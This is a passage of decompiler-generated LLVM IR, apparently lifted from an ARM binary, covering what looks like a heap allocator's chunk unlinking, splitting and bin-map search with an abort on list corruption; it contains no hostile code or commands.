  %v2_e6d8 = add i32 %v1_e6d8, 8
  %v3_e6d8 = inttoptr i32 %v2_e6d8 to i32*
  store i32 %v0_e6d8, i32* %v3_e6d8, align 4
  %v0_e6dc = load i32, i32* %r3.global-to-local, align 4
  %v1_e6dc = load i32, i32* %r1.global-to-local, align 4
  %v2_e6dc = add i32 %v1_e6dc, 820
  %v3_e6dc = inttoptr i32 %v2_e6dc to i32*
  store i32 %v0_e6dc, i32* %v3_e6dc, align 4
  %v0_e6e0 = load i32, i32* @r6, align 4
  %v1_e6e0 = load i32, i32* @lr, align 4
  %v2_e6e0 = add i32 %v1_e6e0, 12
  %v3_e6e0 = inttoptr i32 %v2_e6e0 to i32*
  store i32 %v0_e6e0, i32* %v3_e6e0, align 4
  %v0_e6e4 = load i32, i32* @r6, align 4
  %v1_e6e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_e6e4 = add i32 %v1_e6e4, 8
  %v3_e6e4 = inttoptr i32 %v2_e6e4 to i32*
  store i32 %v0_e6e4, i32* %v3_e6e4, align 4
  %v0_e700.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e700

dec_label_pc_e6ec:                                ; preds = %dec_label_pc_e58c, %dec_label_pc_e544, %dec_label_pc_e5a0
  store i32 68, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r1.global-to-local, align 4
  %v4_e6f4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 68) to i32*), align 4
  store i32 %v4_e6f4, i32* @sb, align 4
  %v0_e6f8 = load i32, i32* @sl, align 4
  %v1_e6f8 = add i32 %v0_e6f8, 16
  store i32 %v1_e6f8, i32* @fp, align 4
  %v1_e6fc = add i32 %v4_e6f4, 52
  store i32 %v1_e6fc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e700

dec_label_pc_e700:                                ; preds = %dec_label_pc_e6b4, %dec_label_pc_e6ec
  %v0_e620 = phi i32 [ %v0_e700.pre, %dec_label_pc_e6b4 ], [ %v1_e6fc, %dec_label_pc_e6ec ]
  %v1_e700 = add i32 %v0_e620, 12
  %v2_e700 = inttoptr i32 %v1_e700 to i32*
  %v3_e700 = load i32, i32* %v2_e700, align 4
  store i32 %v3_e700, i32* @r6, align 4
  %v9_e704 = icmp eq i32 %v3_e700, %v0_e620
  br i1 %v9_e704, label %dec_label_pc_e70c, label %dec_label_pc_e5b4

dec_label_pc_e70c:                                ; preds = %dec_label_pc_e700
  %v0_e70c = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_e70c, 256
  %v0_e7c4.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_e70c.dec_label_pc_e7c4_crit_edge, label %dec_label_pc_e714

dec_label_pc_e70c.dec_label_pc_e7c4_crit_edge:    ; preds = %dec_label_pc_e70c
  %.pre200 = mul i32 %v0_e7c4.pre, 8
  br label %dec_label_pc_e7c4

dec_label_pc_e714:                                ; preds = %dec_label_pc_e70c
  %v4_e714 = mul i32 %v0_e7c4.pre, 8
  %v5_e714 = add i32 %v4_e714, %v0_e620
  store i32 %v5_e714, i32* %r3.global-to-local, align 4
  %v1_e718 = add i32 %v5_e714, -8
  store i32 %v1_e718, i32* %r1.global-to-local, align 4
  %v1_e71c = add i32 %v5_e714, 4
  %v2_e71c = inttoptr i32 %v1_e71c to i32*
  %storemerge.pre = load i32, i32* %v2_e71c, align 4
  br label %dec_label_pc_e7bc

dec_label_pc_e724:                                ; preds = %dec_label_pc_e7bc
  %v1_e724 = add i32 %v1_e74c, 4
  %v2_e724 = inttoptr i32 %v1_e724 to i32*
  %v3_e724 = load i32, i32* %v2_e724, align 4
  store i32 %v3_e724, i32* %r3.global-to-local, align 4
  %v1_e728 = and i32 %v3_e724, -4
  store i32 %v1_e728, i32* %r2.global-to-local, align 4
  %v3_e72c = icmp ult i32 %v1_e728, %v0_e70c
  %v1_e730 = add i32 %v1_e74c, 12
  %v2_e730 = inttoptr i32 %v1_e730 to i32*
  %v3_e730 = load i32, i32* %v2_e730, align 4
  store i32 %v3_e730, i32* %r0.global-to-local, align 4
  br i1 %v3_e72c, label %dec_label_pc_e7bc, label %dec_label_pc_e738

dec_label_pc_e738:                                ; preds = %dec_label_pc_e724
  %v1_e738 = add i32 %v1_e74c, 8
  %v2_e738 = inttoptr i32 %v1_e738 to i32*
  %v3_e738 = load i32, i32* %v2_e738, align 4
  store i32 %v3_e738, i32* %r1.global-to-local, align 4
  %v1_e73c = add i32 %v3_e738, 12
  %v2_e73c = inttoptr i32 %v1_e73c to i32*
  %v3_e73c = load i32, i32* %v2_e73c, align 4
  store i32 %v3_e73c, i32* %r3.global-to-local, align 4
  %v9_e740 = icmp eq i32 %v3_e73c, %v1_e74c
  br i1 %v9_e740, label %dec_label_pc_e748, label %dec_label_pc_e754

dec_label_pc_e748:                                ; preds = %dec_label_pc_e738
  %v1_e748 = add i32 %v3_e730, 8
  %v2_e748 = inttoptr i32 %v1_e748 to i32*
  %v3_e748 = load i32, i32* %v2_e748, align 4
  store i32 %v3_e748, i32* %r3.global-to-local, align 4
  %v9_e74c = icmp eq i32 %v3_e748, %v1_e74c
  br i1 %v9_e74c, label %dec_label_pc_e758, label %dec_label_pc_e754

dec_label_pc_e754:                                ; preds = %dec_label_pc_e738, %dec_label_pc_e748
  %v0_e754 = call i32 @abort()
  store i32 %v0_e754, i32* %r0.global-to-local, align 4
  %v0_e758.pre = load i32, i32* @sl, align 4
  %v1_e758.pre = load i32, i32* @r2, align 4
  %v0_e760.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_e758

dec_label_pc_e758:                                ; preds = %dec_label_pc_e748, %dec_label_pc_e754
  %v1_e760 = phi i32 [ %v3_e730, %dec_label_pc_e748 ], [ %v0_e754, %dec_label_pc_e754 ]
  %v0_e760 = phi i32 [ %v3_e738, %dec_label_pc_e748 ], [ %v0_e760.pre, %dec_label_pc_e754 ]
  %v1_e758 = phi i32 [ %v1_e728, %dec_label_pc_e748 ], [ %v1_e758.pre, %dec_label_pc_e754 ]
  %v0_e758 = phi i32 [ %v0_e70c, %dec_label_pc_e748 ], [ %v0_e758.pre, %dec_label_pc_e754 ]
  %v2_e758 = sub i32 %v1_e758, %v0_e758
  store i32 %v2_e758, i32* %lr.global-to-local, align 4
  %v2_e760 = add i32 %v1_e760, 8
  %v3_e760 = inttoptr i32 %v2_e760 to i32*
  store i32 %v0_e760, i32* %v3_e760, align 4
  %v0_e764 = load i32, i32* %r0.global-to-local, align 4
  %v1_e764 = load i32, i32* %r1.global-to-local, align 4
  %v2_e764 = add i32 %v1_e764, 12
  %v3_e764 = inttoptr i32 %v2_e764 to i32*
  store i32 %v0_e764, i32* %v3_e764, align 4
  %v0_e768 = load i32, i32* %ip.global-to-local, align 4
  %v1_e768 = add i32 %v0_e768, 8
  store i32 %v1_e768, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_e758, 15
  br i1 %tmp207, label %dec_label_pc_e788, label %dec_label_pc_e770

dec_label_pc_e770:                                ; preds = %dec_label_pc_e758
  %v1_e770 = load i32, i32* %r2.global-to-local, align 4
  %v2_e770 = add i32 %v1_e770, %v0_e768
  store i32 %v2_e770, i32* %r2.global-to-local, align 4
  %v1_e774 = add i32 %v2_e770, 4
  %v2_e774 = inttoptr i32 %v1_e774 to i32*
  %v3_e774 = load i32, i32* %v2_e774, align 4
  store i32 %v3_e774, i32* %r3.global-to-local, align 4
  store i32 %v1_e768, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e77c

dec_label_pc_e77c.loopexit:                       ; preds = %dec_label_pc_e61c
  %v1_e628 = load i32, i32* @r6, align 4
  %v2_e628 = load i32, i32* @sl, align 4
  %v3_e628 = add i32 %v2_e628, %v1_e628
  store i32 %v3_e628, i32* %r2.global-to-local, align 4
  %v2_e62c = add i32 %v3_e628, 4
  %v3_e62c = inttoptr i32 %v2_e62c to i32*
  %v4_e62c = load i32, i32* %v3_e62c, align 4
  store i32 %v4_e62c, i32* %r3.global-to-local, align 4
  %v2_e630 = add i32 %v1_e628, 8
  store i32 %v2_e630, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e77c

dec_label_pc_e77c:                                ; preds = %.dec_label_pc_e77c_crit_edge, %dec_label_pc_e77c.loopexit, %dec_label_pc_e770
  %v1_e780 = phi i32 [ %v4_e8a4, %.dec_label_pc_e77c_crit_edge ], [ %v3_e628, %dec_label_pc_e77c.loopexit ], [ %v2_e770, %dec_label_pc_e770 ]
  %v0_e77c = phi i32 [ %v7_e8a4, %.dec_label_pc_e77c_crit_edge ], [ %v4_e62c, %dec_label_pc_e77c.loopexit ], [ %v3_e774, %dec_label_pc_e770 ]
  %v1_e77c = or i32 %v0_e77c, 1
  store i32 %v1_e77c, i32* %r3.global-to-local, align 4
  %v2_e780 = add i32 %v1_e780, 4
  %v3_e780 = inttoptr i32 %v2_e780 to i32*
  store i32 %v1_e77c, i32* %v3_e780, align 4
  br label %dec_label_pc_ed44

dec_label_pc_e788:                                ; preds = %dec_label_pc_e758
  %v1_e788 = load i32, i32* @sl, align 4
  %v2_e788 = add i32 %v1_e788, %v0_e768
  store i32 %v2_e788, i32* %r2.global-to-local, align 4
  %v1_e78c = or i32 %v1_e788, 1
  store i32 %v1_e78c, i32* %r3.global-to-local, align 4
  %v0_e790 = load i32, i32* %lr.global-to-local, align 4
  %v1_e790 = or i32 %v0_e790, 1
  store i32 %v1_e790, i32* %r1.global-to-local, align 4
  store i32 %v1_e768, i32* %r4.global-to-local, align 4
  %v2_e798 = add i32 %v0_e768, 4
  %v3_e798 = inttoptr i32 %v2_e798 to i32*
  store i32 %v1_e78c, i32* %v3_e798, align 4
  %v0_e79c = load i32, i32* %r2.global-to-local, align 4
  %v1_e79c = load i32, i32* @r6, align 4
  %v2_e79c = add i32 %v1_e79c, 8
  %v3_e79c = inttoptr i32 %v2_e79c to i32*
  store i32 %v0_e79c, i32* %v3_e79c, align 4
  %v0_e7a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e7a0 = load i32, i32* @r6, align 4
  %v2_e7a0 = add i32 %v1_e7a0, 12
  %v3_e7a0 = inttoptr i32 %v2_e7a0 to i32*
  store i32 %v0_e7a0, i32* %v3_e7a0, align 4
  %v0_e7a4 = load i32, i32* %lr.global-to-local, align 4
  %v1_e7a4 = load i32, i32* %r2.global-to-local, align 4
  %v3_e7a4 = add i32 %v1_e7a4, %v0_e7a4
  %v4_e7a4 = inttoptr i32 %v3_e7a4 to i32*
  store i32 %v0_e7a4, i32* %v4_e7a4, align 4
  %v0_e7a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_e7a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_e7a8 = add i32 %v1_e7a8, 4
  %v3_e7a8 = inttoptr i32 %v2_e7a8 to i32*
  store i32 %v0_e7a8, i32* %v3_e7a8, align 4
  %v0_e7ac = load i32, i32* @r6, align 4
  %v1_e7ac = load i32, i32* %r2.global-to-local, align 4
  %v2_e7ac = add i32 %v1_e7ac, 12
  %v3_e7ac = inttoptr i32 %v2_e7ac to i32*
  store i32 %v0_e7ac, i32* %v3_e7ac, align 4
  %v0_e7b0 = load i32, i32* @r6, align 4
  %v1_e7b0 = load i32, i32* %r2.global-to-local, align 4
  %v2_e7b0 = add i32 %v1_e7b0, 8
  %v3_e7b0 = inttoptr i32 %v2_e7b0 to i32*
  store i32 %v0_e7b0, i32* %v3_e7b0, align 4
  br label %dec_label_pc_ed44

dec_label_pc_e7bc:                                ; preds = %dec_label_pc_e724, %dec_label_pc_e714
  %v1_e74c = phi i32 [ %storemerge.pre, %dec_label_pc_e714 ], [ %v3_e730, %dec_label_pc_e724 ]
  store i32 %v1_e74c, i32* %ip.global-to-local, align 4
  %v9_e7bc = icmp eq i32 %v1_e74c, %v1_e718
  br i1 %v9_e7bc, label %dec_label_pc_e7c4.loopexit, label %dec_label_pc_e724

dec_label_pc_e7c4.loopexit:                       ; preds = %dec_label_pc_e7bc
  br label %dec_label_pc_e7c4

dec_label_pc_e7c4:                                ; preds = %dec_label_pc_e70c.dec_label_pc_e7c4_crit_edge, %dec_label_pc_e7c4.loopexit
  %v4_e7f4.pre-phi = phi i32 [ %.pre200, %dec_label_pc_e70c.dec_label_pc_e7c4_crit_edge ], [ %v4_e714, %dec_label_pc_e7c4.loopexit ]
  %v1_e7c4 = add i32 %v0_e7c4.pre, 1
  store i32 %v1_e7c4, i32* %r2.global-to-local, align 4
  %v1_e7c8 = urem i32 %v1_e7c4, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r0.global-to-local, align 4
  %v6_e7d4 = shl i32 1, %v1_e7c8
  store i32 %v6_e7d4, i32* %ip.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_e7dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 68) to i32*), align 4
  store i32 %v4_e7dc, i32* %r3.global-to-local, align 4
  %v3_e7e0 = udiv i32 %v1_e7c4, 32
  store i32 %v3_e7e0, i32* @r5, align 4
  %v4_e7e4 = mul nuw nsw i32 %v3_e7e0, 4
  %v5_e7e4 = add i32 %v4_e7dc, %v4_e7e4
  store i32 %v5_e7e4, i32* %r2.global-to-local, align 4
  %v1_e7e8 = add i32 %v5_e7e4, 820
  %v2_e7e8 = inttoptr i32 %v1_e7e8 to i32*
  %v3_e7e8 = load i32, i32* %v2_e7e8, align 4
  store i32 %v3_e7e8, i32* @r4, align 4
  %v1_e7ec = add i32 %v4_e7dc, 52
  store i32 %v1_e7ec, i32* %r3.global-to-local, align 4
  store i32 68, i32* @r8, align 4
  %v5_e7f4 = add i32 %v1_e7ec, %v4_e7f4.pre-phi
  store i32 %v5_e7f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e7f8

dec_label_pc_e7f8:                                ; preds = %dec_label_pc_e860, %dec_label_pc_e7c4
  %v1_e800 = phi i32 [ %v1_e800.pre, %dec_label_pc_e860 ], [ %v3_e7e8, %dec_label_pc_e7c4 ]
  %v0_e800 = phi i32 [ %v0_e7f8.pre, %dec_label_pc_e860 ], [ %v6_e7d4, %dec_label_pc_e7c4 ]
  %v1_e7f8 = sub i32 1, %v0_e800
  %v2_e7f8 = icmp ult i32 %v0_e800, 2
  %v1_e7f8. = select i1 %v2_e7f8, i32 %v1_e7f8, i32 0
  store i32 %v1_e7f8., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_e800, %v1_e800
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_e7f8
  %v5_e804 = or i32 %v1_e7f8., 1
  store i32 %v5_e804, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e810.preheader

bb142:                                            ; preds = %dec_label_pc_e7f8
  %v2_e808 = icmp eq i32 %v1_e7f8., 0
  br i1 %v2_e808, label %.dec_label_pc_e84c.preheader_crit_edge, label %dec_label_pc_e810.preheader

.dec_label_pc_e84c.preheader_crit_edge:           ; preds = %bb142
  %v0_e84454.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e84c.preheader

dec_label_pc_e810.preheader:                      ; preds = %bb142, %.thread12
  %v0_e810.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_e810

dec_label_pc_e810:                                ; preds = %dec_label_pc_e810.preheader, %dec_label_pc_e81c
  %v0_e810 = phi i32 [ %v0_e810.pre, %dec_label_pc_e810.preheader ], [ %v1_e810, %dec_label_pc_e81c ]
  %v1_e810 = add i32 %v0_e810, 1
  store i32 %v1_e810, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_e810, 2
  br i1 %tmp208, label %dec_label_pc_e8f0.loopexit, label %dec_label_pc_e81c

dec_label_pc_e81c:                                ; preds = %dec_label_pc_e810
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r3.global-to-local, align 4
  %v1_e820 = load i32, i32* @r8, align 4
  %v2_e820 = add i32 %v1_e820, ptrtoint (i32* @global_var_23104.179 to i32)
  %v3_e820 = inttoptr i32 %v2_e820 to i32*
  %v4_e820 = load i32, i32* %v3_e820, align 4
  store i32 %v4_e820, i32* %r2.global-to-local, align 4
  %v4_e824 = mul i32 %v1_e810, 4
  %v5_e824 = add i32 %v4_e820, %v4_e824
  store i32 %v5_e824, i32* %r3.global-to-local, align 4
  %v1_e828 = add i32 %v5_e824, 820
  %v2_e828 = inttoptr i32 %v1_e828 to i32*
  %v3_e828 = load i32, i32* %v2_e828, align 4
  store i32 %v3_e828, i32* @r4, align 4
  %v2_e82c = icmp eq i32 %v3_e828, 0
  br i1 %v2_e82c, label %dec_label_pc_e810, label %dec_label_pc_e834

dec_label_pc_e834:                                ; preds = %dec_label_pc_e81c
  %v4_e834 = mul i32 %v1_e810, 256
  %v5_e834 = add i32 %v4_e820, %v4_e834
  store i32 %v5_e834, i32* %r3.global-to-local, align 4
  %v1_e838 = add i32 %v5_e834, 44
  store i32 %v1_e838, i32* %r0.global-to-local, align 4
  %v0_e83c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_e83c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_e84c.preheader

dec_label_pc_e84c.preheader:                      ; preds = %.dec_label_pc_e84c.preheader_crit_edge, %dec_label_pc_e834
  %v0_e84454 = phi i32 [ %v1_e838, %dec_label_pc_e834 ], [ %v0_e84454.pre, %.dec_label_pc_e84c.preheader_crit_edge ]
  %v0_e868 = phi i32 [ %v3_e828, %dec_label_pc_e834 ], [ %v1_e800, %.dec_label_pc_e84c.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_e83c, %dec_label_pc_e834 ], [ %v0_e800, %.dec_label_pc_e84c.preheader_crit_edge ]
  %v2_e84c51 = and i32 %ip.promoted, %v0_e868
  %v4_e84c53 = icmp eq i32 %v2_e84c51, 0
  br i1 %v4_e84c53, label %dec_label_pc_e844, label %dec_label_pc_e854

dec_label_pc_e844:                                ; preds = %dec_label_pc_e84c.preheader, %dec_label_pc_e844
  %v2_e84856 = phi i32 [ %v2_e848, %dec_label_pc_e844 ], [ %ip.promoted, %dec_label_pc_e84c.preheader ]
  %v0_e84455 = phi i32 [ %v1_e844, %dec_label_pc_e844 ], [ %v0_e84454, %dec_label_pc_e84c.preheader ]
  %v1_e844 = add i32 %v0_e84455, 8
  %v2_e848 = mul i32 %v2_e84856, 2
  %v2_e84c = and i32 %v2_e848, %v0_e868
  %v4_e84c = icmp eq i32 %v2_e84c, 0
  br i1 %v4_e84c, label %dec_label_pc_e844, label %dec_label_pc_e84c.dec_label_pc_e854_crit_edge

dec_label_pc_e84c.dec_label_pc_e854_crit_edge:    ; preds = %dec_label_pc_e844
  store i32 %v1_e844, i32* %r0.global-to-local, align 4
  store i32 %v2_e848, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_e854

dec_label_pc_e854:                                ; preds = %dec_label_pc_e84c.dec_label_pc_e854_crit_edge, %dec_label_pc_e84c.preheader
  %v0_e874 = phi i32 [ %v2_e848, %dec_label_pc_e84c.dec_label_pc_e854_crit_edge ], [ %ip.promoted, %dec_label_pc_e84c.preheader ]
  %v0_e898 = phi i32 [ %v1_e844, %dec_label_pc_e84c.dec_label_pc_e854_crit_edge ], [ %v0_e84454, %dec_label_pc_e84c.preheader ]
  %v1_e854 = add i32 %v0_e898, 12
  %v2_e854 = inttoptr i32 %v1_e854 to i32*
  %v3_e854 = load i32, i32* %v2_e854, align 4
  store i32 %v3_e854, i32* @lr, align 4
  %v9_e858 = icmp eq i32 %v3_e854, %v0_e898
  br i1 %v9_e858, label %dec_label_pc_e860, label %dec_label_pc_e880

dec_label_pc_e860:                                ; preds = %dec_label_pc_e854
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r0.global-to-local, align 4
  %v1_e864 = load i32, i32* @r8, align 4
  %v2_e864 = add i32 %v1_e864, ptrtoint (i32* @global_var_23104.179 to i32)
  %v3_e864 = inttoptr i32 %v2_e864 to i32*
  %v4_e864 = load i32, i32* %v3_e864, align 4
  %v2_e868 = sub i32 -1, %v0_e874
  %v3_e868 = and i32 %v0_e868, %v2_e868
  store i32 %v3_e868, i32* @r4, align 4
  %v1_e86c = load i32, i32* @r5, align 4
  %v4_e86c = mul i32 %v1_e86c, 4
  %v5_e86c = add i32 %v4_e86c, %v4_e864
  store i32 %v5_e86c, i32* %r3.global-to-local, align 4
  %v1_e870 = add i32 %v0_e898, 8
  store i32 %v1_e870, i32* %r0.global-to-local, align 4
  %v2_e874 = mul i32 %v0_e874, 2
  store i32 %v2_e874, i32* %ip.global-to-local, align 4
  %v2_e878 = add i32 %v5_e86c, 820
  %v3_e878 = inttoptr i32 %v2_e878 to i32*
  store i32 %v3_e868, i32* %v3_e878, align 4
  %v0_e7f8.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_e800.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e7f8

dec_label_pc_e880:                                ; preds = %dec_label_pc_e854
  %v1_e880 = add i32 %v3_e854, 4
  %v2_e880 = inttoptr i32 %v1_e880 to i32*
  %v3_e880 = load i32, i32* %v2_e880, align 4
  store i32 %v3_e880, i32* %r3.global-to-local, align 4
  %v1_e884 = and i32 %v3_e880, -4
  store i32 %v1_e884, i32* %r2.global-to-local, align 4
  %v0_e888 = load i32, i32* @sl, align 4
  %v2_e888 = sub i32 %v1_e884, %v0_e888
  store i32 %v2_e888, i32* %ip.global-to-local, align 4
  %v1_e88c = add i32 %v3_e854, 12
  %v2_e88c = inttoptr i32 %v1_e88c to i32*
  %v3_e88c = load i32, i32* %v2_e88c, align 4
  store i32 %v3_e88c, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_e888, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_e880
  %v6_e894 = add i32 %v1_e884, %v3_e854
  store i32 %v6_e894, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_e880, %bb143
  %v2_e898 = add i32 %v3_e88c, 8
  %v3_e898 = inttoptr i32 %v2_e898 to i32*
  store i32 %v0_e898, i32* %v3_e898, align 4
  %v0_e89c = load i32, i32* %r3.global-to-local, align 4
  %v1_e89c = load i32, i32* %r0.global-to-local, align 4
  %v2_e89c = add i32 %v1_e89c, 12
  %v3_e89c = inttoptr i32 %v2_e89c to i32*
  store i32 %v0_e89c, i32* %v3_e89c, align 4
  %v4_e8a0 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_e77c_crit_edge, label %dec_label_pc_e8ac

.dec_label_pc_e77c_crit_edge:                     ; preds = %bb144
  %v5_e8a0 = add i32 %v4_e8a0, 8
  store i32 %v5_e8a0, i32* %r4.global-to-local, align 4
  %v4_e8a4 = load i32, i32* %r2.global-to-local, align 4
  %v5_e8a4 = add i32 %v4_e8a4, 4
  %v6_e8a4 = inttoptr i32 %v5_e8a4 to i32*
  %v7_e8a4 = load i32, i32* %v6_e8a4, align 4
  store i32 %v7_e8a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e77c

dec_label_pc_e8ac:                                ; preds = %bb144
  %v1_e8ac = load i32, i32* @sl, align 4
  %v2_e8ac = add i32 %v1_e8ac, %v4_e8a0
  store i32 %v2_e8ac, i32* %r1.global-to-local, align 4
  %v1_e8b4 = load i32, i32* @r6, align 4
  %v2_e8b4 = add i32 %v1_e8b4, 8
  %v3_e8b4 = inttoptr i32 %v2_e8b4 to i32*
  store i32 %v2_e8ac, i32* %v3_e8b4, align 4
  %v0_e8b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_e8b8 = load i32, i32* @r6, align 4
  %v2_e8b8 = add i32 %v1_e8b8, 12
  %v3_e8b8 = inttoptr i32 %v2_e8b8 to i32*
  store i32 %v0_e8b8, i32* %v3_e8b8, align 4
  %v0_e8bc = load i32, i32* @r6, align 4
  %v1_e8bc = load i32, i32* %r1.global-to-local, align 4
  %v2_e8bc = add i32 %v1_e8bc, 8
  %v3_e8bc = inttoptr i32 %v2_e8bc to i32*
  store i32 %v0_e8bc, i32* %v3_e8bc, align 4
  %v0_e8c0 = load i32, i32* @r6, align 4
  %v1_e8c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_e8c0 = add i32 %v1_e8c0, 12
  %v3_e8c0 = inttoptr i32 %v2_e8c0 to i32*
  store i32 %v0_e8c0, i32* %v3_e8c0, align 4
  %tmp210 = icmp ult i32 %v1_e8ac, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_e8ac
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r2.global-to-local, align 4
  %v8_e8cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 68) to i32*), align 4
  store i32 %v8_e8cc, i32* %r3.global-to-local, align 4
  %v4_e8d0 = load i32, i32* %r1.global-to-local, align 4
  %v6_e8d0 = add i32 %v8_e8cc, 48
  %v7_e8d0 = inttoptr i32 %v6_e8d0 to i32*
  store i32 %v4_e8d0, i32* %v7_e8d0, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_e8ac, %bb145
  %v0_e8d4 = load i32, i32* @sl, align 4
  %v1_e8d4 = or i32 %v0_e8d4, 1
  store i32 %v1_e8d4, i32* %r2.global-to-local, align 4
  %v0_e8d8 = load i32, i32* %ip.global-to-local, align 4
  %v1_e8d8 = or i32 %v0_e8d8, 1
  store i32 %v1_e8d8, i32* %r3.global-to-local, align 4
  %v0_e8dc = load i32, i32* @lr, align 4
  %v1_e8dc = add i32 %v0_e8dc, 8
  store i32 %v1_e8dc, i32* %r4.global-to-local, align 4
  %v2_e8e0 = add i32 %v0_e8dc, 4
  %v3_e8e0 = inttoptr i32 %v2_e8e0 to i32*
  store i32 %v1_e8d4, i32* %v3_e8e0, align 4
  %v0_e8e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_e8e4 = load i32, i32* %r1.global-to-local, align 4
  %v3_e8e4 = add i32 %v1_e8e4, %v0_e8e4
  %v4_e8e4 = inttoptr i32 %v3_e8e4 to i32*
  store i32 %v0_e8e4, i32* %v4_e8e4, align 4
  %v0_e8e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e8e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_e8e8 = add i32 %v1_e8e8, 4
  %v3_e8e8 = inttoptr i32 %v2_e8e8 to i32*
  store i32 %v0_e8e8, i32* %v3_e8e8, align 4
  br label %dec_label_pc_ed44

dec_label_pc_e8f0.loopexit:                       ; preds = %dec_label_pc_e810
  br label %dec_label_pc_e8f0

dec_label_pc_e8f0:                                ; preds = %dec_label_pc_e8f0.loopexit, %dec_label_pc_e504, %dec_label_pc_e50c
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %ip.global-to-local, align 4
  %v4_e8f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 68) to i32*), align 4
  store i32 %v4_e8f8, i32* @r0, align 4
  %v1_e8fc = add i32 %v4_e8f8, 44
  %v2_e8fc = inttoptr i32 %v1_e8fc to i32*
  %v3_e8fc = load i32, i32* %v2_e8fc, align 4
  store i32 %v3_e8fc, i32* %ip.global-to-local, align 4
  %v1_e900 = add i32 %v3_e8fc, 4
  %v2_e900 = inttoptr i32 %v1_e900 to i32*
  %v3_e900 = load i32, i32* %v2_e900, align 4
  %v0_e904 = load i32, i32* @sl, align 4
  %v1_e904 = add i32 %v0_e904, 16
  store i32 %v1_e904, i32* %r1.global-to-local, align 4
  %v1_e908 = and i32 %v3_e900, -4
  store i32 %v1_e908, i32* %r3.global-to-local, align 4
  %v3_e90c = icmp ult i32 %v1_e908, %v1_e904
  br i1 %v3_e90c, label %dec_label_pc_e93c, label %dec_label_pc_e918

dec_label_pc_e918:                                ; preds = %dec_label_pc_e8f0
  %v2_e918 = sub i32 %v1_e908, %v0_e904
  %v2_e91c = add i32 %v0_e904, %v3_e8fc
  store i32 %v2_e91c, i32* %r1.global-to-local, align 4
  %v1_e920 = or i32 %v2_e918, 1
  store i32 %v1_e920, i32* %r3.global-to-local, align 4
  %v1_e924 = or i32 %v0_e904, 1
  store i32 %v1_e924, i32* %r2.global-to-local, align 4
  %v1_e928 = add i32 %v3_e8fc, 8
  store i32 %v1_e928, i32* %r4.global-to-local, align 4
  store i32 %v1_e924, i32* %v2_e900, align 4
  %v0_e930 = load i32, i32* %r1.global-to-local, align 4
  %v1_e930 = load i32, i32* @r0, align 4
  %v2_e930 = add i32 %v1_e930, 44
  %v3_e930 = inttoptr i32 %v2_e930 to i32*
  store i32 %v0_e930, i32* %v3_e930, align 4
  %v0_e934 = load i32, i32* %r3.global-to-local, align 4
  %v1_e934 = load i32, i32* %r1.global-to-local, align 4
  %v2_e934 = add i32 %v1_e934, 4
  %v3_e934 = inttoptr i32 %v2_e934 to i32*
  store i32 %v0_e934, i32* %v3_e934, align 4
  br label %dec_label_pc_ed44

dec_label_pc_e93c:                                ; preds = %dec_label_pc_e8f0
  %v1_e93c = inttoptr i32 %v4_e8f8 to i32*
  %v2_e93c = load i32, i32* %v1_e93c, align 4
  store i32 %v2_e93c, i32* %r3.global-to-local, align 4
  %v1_e940 = and i32 %v2_e93c, 2
  store i32 %v1_e940, i32* %ip.global-to-local, align 4
  %v2_e940 = icmp eq i32 %v1_e940, 0
  %v1_e944 = add i32 %v4_e8f8, 860
  %v2_e944 = inttoptr i32 %v1_e944 to i32*
